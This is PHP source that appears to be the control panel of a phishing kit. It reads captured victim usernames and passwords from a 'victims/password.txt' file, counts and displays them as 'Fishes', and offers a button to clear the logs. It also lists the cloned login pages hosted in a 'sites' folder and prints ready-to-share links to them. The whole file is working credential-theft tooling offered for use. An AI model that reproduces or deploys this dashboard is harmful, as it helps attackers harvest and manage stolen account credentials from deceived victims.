<?php session_start();
echo '<meta charset=UTF-8>';
echo '<link rel=stylesheet type=text/css href=./style.css>';
include 'user_info.php';
if (!empty($_SESSION['username']) == $username or ($_POST['username'] == $username && $_POST['password'] == $password))
{
    $_SESSION['valid'] = true;
    $_SESSION['timeout'] = time();
    if (isset($_POST['username']) == null)
    {
    }
    else
    {
        $_SESSION['username'] = $_POST['username'];
    }
    $filename = ".././victims/password.txt";
    $form = "<center><iframe id=hello src=" . $filename . " autocomplete=off style=width:250px;height:200px;overflow:scroll;background-color:#fff;></iframe></center>";
    if (file_exists($filename))
    {
        $str = file_get_contents($filename);
    }
    else
    {
        $str = ' ';
    }
    $num1 = substr_count($str, "username=");
    $num2 = substr_count($str, "password=");
    $num3 = (($num1 + $num2) / 2);
    echo '<script>function aps(){document.getElementById("hello").contentWindow.location.reload();}</script>';
    $dir = '.././sites';
    $efg = $_SERVER['REQUEST_URI'];
    $pat = explode('/', $efg);
    $cds = $_SERVER['SERVER_NAME'];
    for ($i = 0;$i < count($pat) - 2;$i++)
    {
        $cds .= $pat[$i] . "/";
    }
    $hgf = "http://" . $cds . "sites/";
    echo ' <a href=./logout.php><button><b>Logout</b></button></a> </button></a></center>';
   
    echo '<button style=margin-left:40%; onclick=aps() id=collapsible class=collapsible><b>Fishes: ' . $num3 . '</b></button><div class=content>';
    if (file_exists($filename))
    {
        if ($str != "")
        {
            echo $form . '<br><form method=POST action=clear_logs.php><input type=hidden name=key value=Thisissecretfiledeletingkey /><input type=checkbox required> I am 100% sure to <button type=submit style="font-weight:bold;color:#fff;background-color:red;border:4px solid #000000;text-align:center;width:150px;height:30px;" >Clear all logs</button></form><br><br>';
        }
        else
        {
            echo "If victim fished successfully, credientials will be listed here.<br>For Example<br>username=example@gmail.com<br>password=examplepass123<br>from=facebook.php<br><br>//Currently NO username & password found.";
        }
    }
    else
    {
        echo "$filename does not exist. It will be created automatically if victim fished.";
    }
    echo '</div><script>var coll = document.getElementsByClassName("collapsible");var i;for (i = 0; i < coll.length; i++) {coll[i].addEventListener("click", function() {this.classList.toggle("active");var content = this.nextElementSibling;if (content.style.display === "block") {content.style.display = "none";} else {content.style.display = "block";}});}</script>';
    if ($handle = opendir($dir))
    {
        while (false !== ($entry = readdir($handle)))
        {
            $add = ucfirst(str_replace('.php', '', $entry));
            if ($entry != '.' && $entry != '..' && $entry != 'post_database.php' && $entry != 'post_in_file.php' && $entry != 'meta_tags.html' && $entry != 'index.php' && $entry != 'dashboard.php' && $entry != 'logout.php' && $entry != 'phishing_info' && $entry != 'remove branding logo')
            {
                echo '<body><div><center><p style=font-size:large;><b>' . $add . '</b></center></p><center><textarea style=margin-left:-7px; cols=50 rows=2>' . $hgf . $entry . '</textarea></center></div><center><a href=' . $hgf . $entry . ' target="_blank"><font color=#0000b3><b>Test this Link:</b></font> <font color=#0088cc><b>' . $hgf . $entry . '</b></font><a/></center>';
            }
        }
        echo '<br><br><br><center><button>Version</button> <button>User</button>  <br><button><b>20.03</b></button> <button><b>' . $_SESSION['username'] . '</b></button></a> </center>';
        closedir($handle);
    }
}
else
{
    echo '<script>window.location.replace("./index.php");</script>';
} ?>
